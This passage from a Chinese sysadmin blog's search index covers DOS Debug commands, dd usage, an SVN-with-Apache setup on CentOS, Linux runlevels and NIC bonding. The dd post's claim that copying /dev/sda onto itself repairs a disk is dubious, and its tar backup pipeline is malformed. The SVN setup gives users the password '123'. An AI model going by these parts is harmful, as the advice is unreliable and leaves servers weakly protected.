范围内的任何十六进制数字。 value2 代表从 0 到 FFFFh 范围内第二个十六进制数字 8.Debug:I（输入） 从指定的端口读取并显示一个字节值。 i port 参数 port 按地址指定输入端口。地址可以是 16 位的值。 9.Debug:L（加载） 将某个文件或特定磁盘扇区的内容加载到内存。 要从磁盘文件加载 BX:CX 寄存器中指定的字节数内容，请使用以下语法： l [address] 要略过 Windows 2000 文件系统并直接加载特定的扇区，请使用以下语法： l address drive start number 参数 address 指定要在其中加载文件或扇区内容的内存位置。如果不指定 address，Debug 将使用 CS 寄存器中的当前地址。 drive 指定包含读取指定扇区的磁盘的驱动器。该值是数值型：0 = A, 1 = B, 2 = C 等。 start 指定要加载其内容的第一个扇区的十六进制数。 number 指定要加载其内容的连续扇区的十六进制数。只有要加载特定扇区的内容而不是加载 debug 命令行或最近的 Debug n（名称）命令中指定的文件时，才能使用 drive、start 和 number 参数。 10.Debug:M（移动） 将一个内存块中的内容复制到另一个内存块中。 m range address 参数 range 指定要复制内容的内存区域的起始和结束地址，或起始地址和长度。 address 指定要将 range 内容复制到该位置的起始地址。 11.Debug:N（名称） 指定 Debug l（加载）或 w（写入）命令的可执行文件的名称，或者指定正在调试的可执行文件的参数。 n [drive:][path] filename 要指定测试的可执行文件的参数，请使用以下语法： n file-parameters 参数 如果在没有参数的情况下使用，则 n 命令清除当前规范。 [drive:][path] filename 指定要测试的可执行文件的位置和名称。 file-parameters 为正在测试的可执行文件指定参数和开关。 12.Debug:O（输出） 将字节值发送到输出端口。 o port byte-value 参数 port 通过地址指定输出端口。端口地址可以是 16 位值。 byte-value 指定要指向 port 的字节值。 13.Debug:P（执行） 执行循环、重复的字符串指令、软件中断或子例程；或通过任何其他指令跟踪。 p [= address] [number] 参数 =address 指定第一个要执行指令的位置。如果不指定地址，则默认地址是在 CS:IP 寄存器中指定的当前地址。 number 指定在将控制返回给 Debug 之前要执行的指令数。默认值为 1。 14.Debug:Q（退出） 停止 Debug 会话，不保存当前测试的文件。 当您键入 q 以后，控制返回到 Windows 2000 的命令提示符。 q 参数 该命令不带参数。 注：是如果从CMD进入DEBUG，则才会有上面这张图，如果是从运行里直接进入DEBUG的话则没有上面这张图片 15. *Debug:r（寄存器） 显示或改变一个或多个 CPU 寄存器的内容。 r [register-name] 参数 无 如果在没有参数的情况下使用，则 r 命令显示所有寄存器的内容以及寄存器存储区域中的标志。 register-name 指定要显示其内容的寄存器名。 16.Debug:s（搜索） 在某个地址范围搜索一个或多个字节值的模式。 s range list 参数 range 指定要搜索范围的开始和结束地址。有关 range 参数有效值的信息，请单击“相关主题”列表中的 Debug。 list 指定一个或多个字节值的模式，或要搜索的字符串。用空格或逗号分隔每个字节值和下一个字节值。将字符串值包括在引号中。 17. *Debug:T（跟踪） 执行一条指令，并显示所有注册的内容、所有标志的状态和所执行指令的解码形式。 t [=address] [number] 参数 =address 指定 Debug 启动跟踪指令的地址。如果省略 address 参数，跟踪将从程序的 CS:IP 寄存器所指定的地址开始。 number 指定要跟踪的指令数。该值必须是十六进制数。默认值为 1。 18. *Debug:U（反汇编） 反汇编字节并显示相应的原语句，其中包括地址和字节值。反汇编代码看起来象已汇编文件的列表。 u [range] 参数 无 如果在没有参数的情况下使用，则 u 命令分解 20h 字节（默认值），从前面 u 命令所显示地址后的第一个地址开始。 range 指定要反汇编代码的起始地址和结束地址，或起始地址和长度。 19.Debug:W（写入） 将文件或特定分区写入磁盘。 要将在 BX:CX 寄存器中指定字节数的内容写入磁盘文件，请使用以下语法： w [address] 要略过 Windows 2000 文件系统并直接写入特定的扇区，请使用以下语法： w address drive start number 参数 address 指定要写到磁盘文件的文件或部分文件的起始内存地址。如果不指定 address，Debug 程序将从 CS:100 开始。 drive 指定包含目标盘的驱动器。该值是数值型：0 = A, 1 = B, 2 = C,等等。 start 指定要写入第一个扇区的十六进制数。 number 指定要写入的扇区数。 20.Debug:XA（分配扩展内存） 分配扩展内存的指定页面数。 要使用扩展内存，必须安装符合 4.0 版的 Lotus/Intel/Microsoft 扩展内存规范 (LIM EMS) 的扩展内存设备驱动程序。 xa [count] 参数 count 指定要分配的扩展内存的 16KB 页数。 21.Debug:XD（取消分配扩展内存） 释放指向扩展内存的句柄。 要使用扩展内存，必须安装符合 4.0 版的 Lotus/Intel/Microsoft 扩展内存规范 (LIM EMS) 的扩展内存设备驱动程序。 xd [handle] 参数 handle 指定要释放的句柄。 22.Debug:XM（映射扩展内存页） 将属于指定句柄的扩展内存逻辑页映射到扩展内存的物理页。 要使用扩展内存，必须安装符合 4.0 版的 Lotus/Intel/Microsoft 扩展内存规范 (LIM EMS) 的扩展内存设备驱动程序。 xm [lpage] [ppage] [handle] 参数 lpage 指定要映射到物理页 ppage 的扩展内存的逻辑页面号。 ppage 指定将 lpage 映射到的物理页面号。 handle 指定句柄。 23.Debug:XS（显示扩展内存状态） 显示有关扩展内存状态的信息。 要使用扩展内存，必须安装符合 4.0 版的 Lotus/Intel/Microsoft 扩展内存规范 (LIM EMS) 的扩展内存设备驱动程序。 xs 参数 该命令不带参数。 常用: r 显示/修改 寄存器 d 段地址:偏移地址 - 偏移地址 u 将后续的字节翻译成汇编指令， 查看汇编翻译 a 段地址:偏移地址 写入执行汇编指令 e 段地址:偏移地址 e 1000:0 &quot;abcdef&quot; e 1000:0 01.31 02.32 03.33 d 查看 显示为123 --- acsii t 执行当前寄存器内汇编指令 cs:ip","categories":[],"tags":[{"name":"Asm","slug":"Asm","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Asm/"}]},{"title":"dd常用参数","slug":"commands/dd","date":"2018-05-13T11:34:29.000Z","updated":"2018-12-05T11:06:05.990Z","comments":true,"path":"2018/05/13/commands/dd/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/05/13/commands/dd/","excerpt":"Linux dd命令用于读取、转换并输出数据。 dd可从标准输入或文件中读取数据，根据指定的格式来转换数据，再输出到文件、设备或标准输出。 /dev/null和/dev/zero的区别/dev/null，外号叫无底洞，你可以向它输出任何数据，它通吃，并且不会撑着！/dev/zero,是一个输入设备，你可你用它来初始化文件。 磁盘长时间放置: 容易造成磁盘头损坏。 1dd if=/dev/sda of=/dev/sda 来进行无损修复; 备份sda数据,并利用tar工具打包,保存到指定路径:1dd if=/dev/sda | tar -czvf &gt; ~/sda.tar.gz 创建1G文件1dd if=/dev/zero of=test bs=1M count=1024","text":"Linux dd命令用于读取、转换并输出数据。 dd可从标准输入或文件中读取数据，根据指定的格式来转换数据，再输出到文件、设备或标准输出。 /dev/null和/dev/zero的区别/dev/null，外号叫无底洞，你可以向它输出任何数据，它通吃，并且不会撑着！/dev/zero,是一个输入设备，你可你用它来初始化文件。 磁盘长时间放置: 容易造成磁盘头损坏。 1dd if=/dev/sda of=/dev/sda 来进行无损修复; 备份sda数据,并利用tar工具打包,保存到指定路径:1dd if=/dev/sda | tar -czvf &gt; ~/sda.tar.gz 创建1G文件1dd if=/dev/zero of=test bs=1M count=1024 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970Usage: dd [OPERAND]... or: dd OPTIONCopy a file, converting and formatting according to the operands. bs=BYTES read and write up to BYTES bytes at a time cbs=BYTES convert BYTES bytes at a time conv=CONVS convert the file as per the comma separated symbol list count=N copy only N input blocks ibs=BYTES read up to BYTES bytes at a time (default: 512) if=FILE read from FILE instead of stdin iflag=FLAGS read as per the comma separated symbol list obs=BYTES write BYTES bytes at a time (default: 512) of=FILE write to FILE instead of stdout oflag=FLAGS write as per the comma separated symbol list seek=N skip N obs-sized blocks at start of output skip=N skip N ibs-sized blocks at start of input status=LEVEL The LEVEL of information to print to stderr; 'none' suppresses everything but error messages, 'noxfer' suppresses the final transfer statistics, 'progress' shows periodic transfer statisticsN and BYTES may be followed by the following multiplicative suffixes:c =1, w =2, b =512, kB =1000, K =1024, MB =1000*1000, M =1024*1024, xM =MGB =1000*1000*1000, G =1024*1024*1024, and so on for T, P, E, Z, Y.Each CONV symbol may be: ascii from EBCDIC to ASCII ebcdic from ASCII to EBCDIC ibm from ASCII to alternate EBCDIC block pad newline-terminated records with spaces to cbs-size unblock replace trailing spaces in cbs-size records with newline lcase change upper case to lower case ucase change lower case to upper case sparse try to seek rather than write the output for NUL input blocks swab swap every pair of input bytes sync pad every input block with NULs to ibs-size; when used with block or unblock, pad with spaces rather than NULs excl fail if the output file already exists nocreat do not create the output file notrunc do not truncate the output file noerror continue after read errors fdatasync physically write output file data before finishing fsync likewise, but also write metadataEach FLAG symbol may be: append append mode (makes sense only for output; conv=notrunc suggested) direct use direct I/O for data directory fail unless a directory dsync use synchronized I/O for data sync likewise, but also for metadata fullblock accumulate full blocks of input (iflag only) nonblock use non-blocking I/O noatime do not update access time nocache discard cached data noctty do not assign controlling terminal from file nofollow do not follow symlinks count_bytes treat 'count=N' as a byte count (iflag only) skip_bytes treat 'skip=N' as a byte count (iflag only) seek_bytes treat 'seek=N' as a byte count (oflag only)Sending a USR1 signal to a running 'dd' process makes itprint I/O statistics to standard error and then resume copying. $ dd if=/dev/zero of=/dev/null&amp; pid=$! $ kill -USR1 $pid; sleep 1; kill $pid 18335302+0 records in 18335302+0 records out 9387674624 bytes (9.4 GB) copied, 34.6279 seconds, 271 MB/s","categories":[{"name":"命令","slug":"命令","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/命令/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Commands","slug":"Commands","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Commands/"}]},{"title":"CentOS6.9  apached + svn","slug":"yunwei/CentOS6-9-apached-svn","date":"2018-05-03T13:56:55.000Z","updated":"2018-11-19T16:15:08.375Z","comments":true,"path":"2018/05/03/yunwei/CentOS6-9-apached-svn/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/05/03/yunwei/CentOS6-9-apached-svn/","excerpt":"【环境】Centos6.4 X86_64 minimum，iptables,selinux已关闭，所需软件包采取yum安装方式 【SVN客户端软件】TortoiseSVN","text":"【环境】Centos6.4 X86_64 minimum，iptables,selinux已关闭，所需软件包采取yum安装方式 【SVN客户端软件】TortoiseSVN 不得不说的svn客户端的4种访问方式​ 先说说apache+svn，安装subversion包之后能用客户端访问了，但是不能从网页访问，于是考虑到集成apache和svn，提供更亲和的网页访问方式，但是配置完网页访问后傻眼了，一个简陋的版本库页面，只能浏览和下载不能上传，看来客户端访问还是主流 ​ 但是转念一想客户端也有版本库浏览器，同时还能上传下载，那要apache+svn干什么，直到我看到同事误把我写的服务器使用说明文档里的网页访问地址http://serverIP/svn/test粘贴到TortoiseSVN客户端的url里，居然也访问成功了，我才意识到apache+svn和单独的subversion是两种完全不同的访问方式 ​ 原来以为apache+svn必须在subversion启动的条件下同时启动apache，并且保持subversion和apache配置完全一致才行，弄明白了之后才发现完全不是这么回事 ​ 实际上apache+svn是通过http协议80端口访问版本库，subversion是通过svn协议的3690端口访问版本库，这两种方式互不干涉，可以只启动80，不启动3690，也可以只启3690，不启80，还可以同时启动80和3690，甚至这两种方式的版本库根目录都可以不同的，用户名和密码也可以不同，apache+svn用的是htpasswd的用户名和密码，subversion用的是svnserve.conf指定的passwd文件里的用户名和密码，说白了apache+svn和单独的svn服务是两种完全不同svn服务类型 OK，做个总结： 实际上TortoiseSVN支持总共4种访问方式 svn也就是独立的subversion服务，通过3690端口访问 http也就是apache+svn，通过80端口访问 https也就是apache+svn+ssl，通过443端口访问 svn+ssh也就是ssh+svn，这种稍微特殊，借用ssh隧道访问svn版本库，通过22端口访问，本文不涉及这种访问方式，有兴趣的话大家可以自己去查相关资料 ​ 【注】windows有个visualsvn好像是直接集成的apache和svn，不知道visualsvn是否有网页上传功能呢。因为一般在linux上部署svn性能更好，安全稳定性更高，所以就没研究windows的svn，大家有兴趣的话可以自己安装个visualsvn试试 配置SVN服务安装svn1yum install subversion 创建版本库12mkdir -pv /svn/svnrepos ##建立版本库路径svnadmin create /svn/svnrepos ##建立svnrepos svn库 目录 以及文件配置12345678910111213141516171819202122232425262728293031323334353637[root@svn svnrepos]# tree -L 2.├── conf│ ├── passwd│ └── svnserve.conf├── dav│ └── activities.d├── db│ ├── current│ ├── format│ ├── fsfs.conf│ ├── fs-type│ ├── min-unpacked-rev│ ├── rep-cache.db│ ├── revprops│ ├── revs│ ├── transactions│ ├── txn-current│ ├── txn-current-lock│ ├── txn-protorevs│ ├── uuid│ └── write-lock├── format├── hooks│ ├── post-commit.tmpl│ ├── post-lock.tmpl│ ├── post-revprop-change.tmpl│ ├── post-unlock.tmpl│ ├── pre-commit.tmpl│ ├── pre-lock.tmpl│ ├── pre-revprop-change.tmpl│ ├── pre-unlock.tmpl│ └── start-commit.tmpl├── locks│ ├── db.lock│ └── db-logs.lock└── README.txt svnserve.conf配置项 123456[general]anon-access = none #匿名用户无任何权限，如果想匿名用户可读，设置为read即可，默认readauth-access = write #认证通过的用户可读可写password-db = /svn/svnrepos/etc/passwd #用户名密码文件存放位置authz-db = /svn/svnrepos/etc/authz #库权限配置文件存放位置realm = Unimation #认证域名，相同认证域名的库的密码缓存可以在多个版本库之间共享 【注】默认每个库都有一个svnserve.conf, 如果所有库共用一个svnserve.conf，可以在启动svn服务的时候指定添加--config-file=filename, svn服务启动的时候将不会再去读取默认配置文件，而会读取指定svnserve.conf passwd 配置 1234[users]harry = harryssecret #定义库的用户和密码，格式为username = passwdsally = sallyssecrettom = tomssecret authz配置项 12345678[groups] #定义组和成员devteam = harry,sally #格式为groupname = member1,member2[svnrepos:/] #定义test1库根目录的访问权限* = r #所有用户可读@devteam = rw #开发组成员读写，注意组名前面要加@[svnrepos:/tomproject] #定义test1下tomproject文件夹的权限tom = rw #tom读写 启停svn服务 1234svnserve -d -r /svn/svnrepos# -d 以守护进程的方式运行svn服务# -r 指定版本库根目录# --listen-port 指定监听端口，默认端口3690 此时即可通过 svn://ip/svn/svnrepos访问 【注】同时运行多个库是和svn服务启动的时候的版本库根目录(-r 参数)有直接关系的，在版本库目录底下建多个库，启动的时候就可以把这些库一并启动起来，登陆时只需要指定不同的库名即可。 删除删除整库是没有svnadmin remove这种命令， 直接rm -rf删除整个库文件夹即可. 配置apache + svn准备相关库以及程序包12yum -y install httpd httpd-devel mod_dav_svn subversion mod_sslyum install openssl-devel apr-1.6.3.tar.gz 12345#tar –zvxf apr-1.4.2.tar.gz#cd apr-1.4.2#./configure 安装不指定路径时 默认安装到/usr/local/apr#make#make install apr-util-1.6.1.tar.gz 1234#tar –zxvf apr-util-1.3.10.tar.gz#cd apr-util-1.3.10#./configure --with-apr=/usr/local/apr#make &amp;&amp; make install httpd-2.4.33.tar.bz2 12345#tar zxvf httpd-2.2.22.tar.gz#cd httpd-2.2.22#./configure --prefix=/usr/local/apache --with-apr=/usr/local/apr/bin/apr-1-config --with-apr-util=/usr/local/apr/bin/apu-1-config --enable-modules=so --enable-dav --enable-maintainer-mode--enable-rewrite#make#make install 12报错: mod_so can not be built as a shared DSO 使用–enable-modules=all即可，编译安装成功。如： 1./configure --prefix=/usr/local/apache --with-apr=/usr/local/apr/bin/apr-1-config --with-apr-util=/usr/local/apr/bin/apu-1-config --enable-modules=so --enable-dav --enable-maintainer-mode--enable-rewrite --enable-modules=all ####apached 依赖库 1234567apachectl -t -D DUMP_MODULES|grep svn #查看apache是否已经加载了dav_svn_module和authz_svn_module 一般yum安装的apache模块都会在启动时自动加载，如果尚未加载，在http.conf文件中添加如下内容后重启httpd服务即可 sed -i &apos;/Options Indexes/s/Indexes/-Indexes/&apos; /etc/httpd/conf/httpd.conf#其中&quot;-&quot;表示不允许列目录 httpd.conf12345#vim /etc/httpd/conf/httpd.confLoadModule dav_svn_module modules/mod_dav_svn.soLoadModule authz_svn_module modules/mod_authz_svn.so 此外，鉴于svn需要列出文件夹内容，建议把apache的默认列目录功能关闭，防止svn以外的目录被列出结构，提升安全性 httpd.conf 中 location配置配置一: 12345678910#vim /etc/httpd/conf/httpd.conf&lt;Location /svn&gt; DAV svn #使用svn模块 SVNParentPath /svn/svnrepos #svn版本库根目录 AuthType Basic #认证类型：基本身份认证 AuthName &quot;SVN&quot; #认证名称 AuthUserFile /svn/svnrepos/etc/.htpasswd #指定用户名密码文件路径 AuthzSVNAccessFile /svn/svnrepos/etc/authz #指定authz文件路径 Require valid-user #有效用户可以访问&lt;/Location&gt; 配置二: 1234567891011121314151617##存在异常;&lt;Location /svn&gt; DAV svn SVNParentPath /svn AuthType Basic AuthName &quot;UnimationTech&quot; AuthUserFile /svn/svnrepos/etc/.htpasswd AuthzSVNAccessFile /svn/svnrepos/etc/authz # Limit write permission to list of valid users. #&lt;LimitExcept GET PROPFIND OPTIONS REPORT&gt; # Require SSL connection for password protection. # SSLRequireSSL Require valid-user -- 在其中时 svn 客户端下载将不会进行用户名验证 #&lt;/LimitExcept&gt;&lt;/Location&gt; 【注】\\和\\的区别，\\是虚拟目录，用\\可以隐藏真实路径，而\\是直接使用真实路径 htpasswd密码文件123htpasswd -bc /svn/svnrepos/etc/.htpasswd root 123htpasswd -b /svn/svnrepos/etc/.htpasswd lg 123htpasswd -b /svn/svnrepos/etc/.htpasswd scb 123 权限修改1234chmod 600 /svn/svnrepos/etc/.htpasswd #修改权限提升安全性chown -R apache.apache /svn #最后别忘了修改版本库目录权限service httpd restart #重启服务chmod -R 700 /svn #权限 authz1234567891011121314151617181920212223242526272829303132333435363738394041[groups]super_user = rootmanage_user = wyh, cgq, lglFA = lg, scbSpecial = ml, lhjnService = hjw, zj[svnrepos:/]@super_user = rw@manage_user = rw@FA = rw* = r[svnrepos:/FA]@super_user = rw@manage_user = rw@FA = rw* = [svnrepos:/Market_Department]@super_user = rw@manage_user = rw@Service = rw* = [svnrepos:/Services_Department]@super_user = rw@manage_user = rw@Service = rw* = [svnrepos:/Shared_Dir]@super_user = rw* = r[svnrepos:/Special_robot]@super_user = rw@manage_user = rw@Special = rw* = 【参考】 Linux-SVN部署","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Centos","slug":"Centos","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Centos/"}]},{"title":"Linux运行级别","slug":"yunwei/Linux运行级别","date":"2018-04-23T13:12:16.000Z","updated":"2018-09-29T13:14:14.134Z","comments":true,"path":"2018/04/23/yunwei/Linux运行级别/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/04/23/yunwei/Linux运行级别/","excerpt":"Linux 系统主要启动步骤 读取 MBR 的信息，启动 Boot Manager。 加载系统内核，启动 init 进程， init 进程是 Linux 的根进程，所有的系统进程都是它的子进程。 init 进程读取 /etc/inittab 文件中的信息，并进入预设的运行级别。通常情况下 /etc/rcS.d/ 目录下的启动脚本首先被执行，然后是/etc/rcX.d/ 目录。 根据 /etc/rcS.d/ 文件夹中对应的脚本启动 Xwindow 服务器 xorg，Xwindow 为 Linux 下的图形用户界面系统。 启动登录管理器，等待用户登录。 12345678910111213[Postgres@svn etc]$ cat /etc/inittab # inittab is only used by upstart for the default runlevel.## Default runlevel. The runlevels used are:# 0 - halt (Do NOT set initdefault to this)# 1 - Single user mode# 2 - Multiuser, without NFS (The same as 3, if you do not have networking)# 3 - Full multiuser mode# 4 - unused# 5 - X11# 6 - reboot (Do NOT set initdefault to this)# id:5:initdefault:","text":"Linux 系统主要启动步骤 读取 MBR 的信息，启动 Boot Manager。 加载系统内核，启动 init 进程， init 进程是 Linux 的根进程，所有的系统进程都是它的子进程。 init 进程读取 /etc/inittab 文件中的信息，并进入预设的运行级别。通常情况下 /etc/rcS.d/ 目录下的启动脚本首先被执行，然后是/etc/rcX.d/ 目录。 根据 /etc/rcS.d/ 文件夹中对应的脚本启动 Xwindow 服务器 xorg，Xwindow 为 Linux 下的图形用户界面系统。 启动登录管理器，等待用户登录。 12345678910111213[Postgres@svn etc]$ cat /etc/inittab # inittab is only used by upstart for the default runlevel.## Default runlevel. The runlevels used are:# 0 - halt (Do NOT set initdefault to this)# 1 - Single user mode# 2 - Multiuser, without NFS (The same as 3, if you do not have networking)# 3 - Full multiuser mode# 4 - unused# 5 - X11# 6 - reboot (Do NOT set initdefault to this)# id:5:initdefault: 运行级别​ 0：关机。不能将系统缺省运行级别设置为0，否则无法启动。 1：单用户模式，只允许root用户对系统进行维护。 2：多用户模式，但不能使用NFS(相当于Windows下的网上邻居) 3：字符界面的多用户模式。 4：未定义。 5：图形界面的多用户模式。 6：重启。不能将系统缺省运行级别设置为0，否则会一直重启。 查看运行级别 1runlevel 切换运行级别 1init [0123456] chkconfig 按运行级别启动开机服务 1chkconfig --level 2345 sshd on","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Centos","slug":"Centos","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Centos/"}]},{"title":"Linux 网卡绑定","slug":"yunwei/Linux-网卡绑定","date":"2018-04-20T14:10:43.000Z","updated":"2018-11-27T13:35:53.804Z","comments":true,"path":"2018/04/20/yunwei/Linux-网卡绑定/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/04/20/yunwei/Linux-网卡绑定/","excerpt":"什么是bond 网卡bond是通过多张网卡绑定为一个逻辑网卡，实现本地网卡的冗余，带宽扩容和负载均衡，在生产场景中是一种常用的技术。Kernels 2.4.12及以后的版本均供bonding模块，以前的版本可以通过patch实现。可以通过以下命令确定内核是否支持 bonding： 123456[root@svn bonding]# uname -r2.6.32-696.23.1.el6.x86_64[root@svn bonding]# [root@svn bonding]# [root@svn bonding]# cat /boot/config-2.6.32-696.23.1.el6.x86_64 | grep -i bondingCONFIG_BONDING=m","text":"什么是bond 网卡bond是通过多张网卡绑定为一个逻辑网卡，实现本地网卡的冗余，带宽扩容和负载均衡，在生产场景中是一种常用的技术。Kernels 2.4.12及以后的版本均供bonding模块，以前的版本可以通过patch实现。可以通过以下命令确定内核是否支持 bonding： 123456[root@svn bonding]# uname -r2.6.32-696.23.1.el6.x86_64[root@svn bonding]# [root@svn bonding]# [root@svn bonding]# cat /boot/config-2.6.32-696.23.1.el6.x86_64 | grep -i bondingCONFIG_BONDING=m bond的模式mode=0（balance-rr）​ 表示负载分担round-robin，并且是轮询的方式比如第一个包走eth0，第二个包走eth1，直到数据包发送完毕。 ​ 优点：流量提高一倍 ​ 缺点：需要接入交换机做端口聚合，否则可能无法使用 mode=1（active-backup）​ 表示主备模式，即同时只有1块网卡在工作。 ​ 优点：冗余性高 ​ 缺点：链路利用率低，两块网卡只有1块在工作 mode=2(balance-xor)(平衡策略)​ 表示XOR Hash负载分担，和交换机的聚合强制不协商方式配合。（需要xmit_hash_policy，需要交换机配置port channel） ​ 特点：基于指定的传输HASH策略传输数据包。缺省的策略是：(源MAC地址 XOR 目标MAC地址) % slave数量。其他的传输策略可以通过xmit_hash_policy选项指定，此模式提供负载平衡和容错能力 mode=3(broadcast)(广播策略)​ 表示所有包从所有网络接口发出，这个不均衡，只有冗余机制，但过于浪费资源。此模式适用于金融行业，因为他们需要高可靠性的网络，不允许出现任何问题。需要和交换机的聚合强制不协商方式配合。 ​ 特点：在每个slave接口上传输每个数据包，此模式提供了容错能力 mode=4(802.3ad)(IEEE 802.3ad 动态链接聚合)​ 表示支持802.3ad协议，和交换机的聚合LACP方式配合（需要xmit_hash_policy）.标准要求所有设备在聚合操作时，要在同样的速率和双工模式，而且，和除了balance-rr模式外的其它bonding负载均衡模式一样，任何连接都不能使用多于一个接口的带宽。 ​ 特点：创建一个聚合组，它们共享同样的速率和双工设定。根据802.3ad规范将多个slave工作在同一个激活的聚合体下。外出流量的slave选举是基于传输hash策略，该策略可以通过xmit_hash_policy选项从缺省的XOR策略改变到其他策略。需要注意的是，并不是所有的传输策略都是802.3ad适应的，尤其考虑到在802.3ad标准43.2.4章节提及的包乱序问题。不同的实现可能会有不同的适应性。 ​ 必要条件： ​ 条件1：ethtool支持获取每个slave的速率和双工设定 ​ 条件2：switch(交换机)支持IEEE802.3ad Dynamic link aggregation ​ 条件3：大多数switch(交换机)需要经过特定配置才能支持802.3ad模式 mode=5(balance-tlb)(适配器传输负载均衡)​ 是根据每个slave的负载情况选择slave进行发送，接收时使用当前轮到的slave。该模式要求slave接口的网络设备驱动有某种ethtool支持；而且ARP监控不可用。 ​ 特点：不需要任何特别的switch(交换机)支持的通道bonding。在每个slave上根据当前的负载（根据速度计算）分配外出流量。如果正在接受数据的slave出故障了，另一个slave接管失败的slave的MAC地址。 ​ 必要条件： ​ ethtool支持获取每个slave的速率 mode=6(balance-alb)(适配器适应性负载均衡)​ 在5的tlb基础上增加了rlb(接收负载均衡receiveload balance).不需要任何switch(交换机)的支持。接收负载均衡是通过ARP协商实现的. ​ 特点：该模式包含了balance-tlb模式，同时加上针对IPV4流量的接收负载均衡(receiveload balance, rlb)，而且不需要任何switch(交换机)的支持。接收负载均衡是通过ARP协商实现的。bonding驱动截获本机发送的ARP应答，并把源硬件地址改写为bond中某个slave的唯一硬件地址，从而使得不同的对端使用不同的硬件地址进行通信。来自服务器端的接收流量也会被均衡。当本机发送ARP请求时，bonding驱动把对端的IP信息从ARP包中复制并保存下来。当ARP应答从对端到达时，bonding驱动把它的硬件地址提取出来，并发起一个ARP应答给bond中的某个slave。使用ARP协商进行负载均衡的一个问题是：每次广播 ARP请求时都会使用bond的硬件地址，因此对端学习到这个硬件地址后，接收流量将会全部流向当前的slave。这个问题可以通过给所有的对端发送更新（ARP应答）来解决，应答中包含他们独一无二的硬件地址，从而导致流量重新分布。当新的slave加入到bond中时，或者某个未激活的slave重新激活时，接收流量也要重新分布。接收的负载被顺序地分布（round robin）在bond中最高速的slave上当某个链路被重新接上，或者一个新的slave加入到bond中，接收流量在所有当前激活的slave中全部重新分配，通过使用指定的MAC地址给每个 client发起ARP应答。下面介绍的updelay参数必须被设置为某个大于等于switch(交换机)转发延时的值，从而保证发往对端的ARP应答不会被switch(交换机)阻截。 bond模式小结：​ mode5和mode6不需要交换机端的设置，网卡能自动聚合。mode4需要支持802.3ad。mode0，mode2和mode3理论上需要静态聚合方式。 配置bond 设置bond时，应将NetworkManager关闭; 1service NetworkManager stop 关闭开机自启动 1chkconfig --level 345 NetworkManager off ​ 测试环境:123456789101112[root@svn network-scripts]# uname -aLinux svn.domain 2.6.32-696.23.1.el6.x86_64 #1 SMP Tue Mar 13 22:44:18 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux[root@svn network-scripts]# [root@svn network-scripts]# [root@svn network-scripts]# cat /etc/redhat-release CentOS release 6.9 (Final)网卡信息:2: em1: &lt;BROADCAST,MULTICAST,SLAVE,UP,LOWER_UP&gt; mtu 1500 qdisc mq master bond0 state UP qlen 1000 link/ether d0:94:66:3f:30:3e brd ff:ff:ff:ff:ff:ff3: em2: &lt;BROADCAST,MULTICAST,SLAVE,UP&gt; mtu 1500 qdisc mq master bond0 state UNKNOWN qlen 1000 link/ether d0:94:66:3f:30:3e brd ff:ff:ff:ff:ff:ff 配置物理网卡:1234567891011121314[root@svn network-scripts]# cat /etc/sysconfig/network-scripts/ifcfg-em1 DEVICE=em1TYPE=EthernetONBOOT=yesBOOTPROTO=noneMASTER=bond0SLAVE=yes [root@svn network-scripts]# cat /etc/sysconfig/network-scripts/ifcfg-em2 DEVICE=em2TYPE=EthernetONBOOT=yesBOOTPROTO=noneMASTER=bond0SLAVE=yes 配置逻辑网卡12345678910[root@svn network-scripts]# cat /etc/sysconfig/network-scripts/ifcfg-bond0 DEVICE=bond0TYPE=EthernetONBOOT=yesBOOTPROTO=staticIPADDR=192.168.2.250NETMASK=255.255.255.0DNS2=8.8.8.8GATEWAY=192.168.2.1DNS1=114.114.114.114 bond配置文件: 123[root@svn modprobe.d]# cat /etc/modprobe.d/modprobe.conf &#123;不存在此目录，可以直接放在/etc/下&#125;alias bond0 bondingoptions bond0 miimon=100 mode=6 配置bond0的链路检查时间为100ms，模式为6。 警告 bond0获取mac地址有两种方式: ​ 一种是从第一个活跃网卡中获取mac地址，然后其余的SLAVE网卡的mac地址都使用该mac地址； ​ 另一种是使用fail_over_mac参数，是bond0使用当前活跃网卡的mac地址，mac地址或者活跃网卡的转换而变。 vmware workstation 不支持第一种获取mac地址的方式，那么可以使用fail_over_mac=1参数，所以这里我们添加fail_over_mac=1参数 12alias bond0 bondingoptions bond0 miimon=100 mode=6 fail_over_mac=1 加载bonding模块驱动1[root@svn modprobe.d]# modprobe bonding 加载驱动 使用lsmod查看是否加载成功: 12345[root@svn modprobe.d]# lsmod Module Size Used bybonding 133013 0 nf_conntrack_ipv4 9218 2 nf_defrag_ipv4 1483 1 nf_conntrack_ipv4 重新加载网络服务，用于启动bonding 1service network restart 查看绑定结果:123456789101112131415161718192021222324[root@svn modprobe.d]# cat /proc/net/bonding/bond0 Ethernet Channel Bonding Driver: v3.7.1 (April 27, 2011)Bonding Mode: load balancing (round-robin)MII Status: upMII Polling Interval (ms): 0Up Delay (ms): 0Down Delay (ms): 0Slave Interface: em1MII Status: upSpeed: 100 MbpsDuplex: fullLink Failure Count: 0Permanent HW addr: d0:94:66:3f:30:3eSlave queue ID: 0Slave Interface: em2MII Status: upSpeed: UnknownDuplex: UnknownLink Failure Count: 0Permanent HW addr: d0:94:66:3f:30:3fSlave queue ID: 0 测试分别轮换down掉网卡, 进行不同网段ping/ssh链接; 查看是否存在异常问题; 删除Bond网卡绑定 删除bond0设备文件 1rm -rf /etc/sysconfig/network-scripts/ifcfg-bond0 删除绑定的网卡配置文件内容 12MASTER=bond0SLAVE=yes 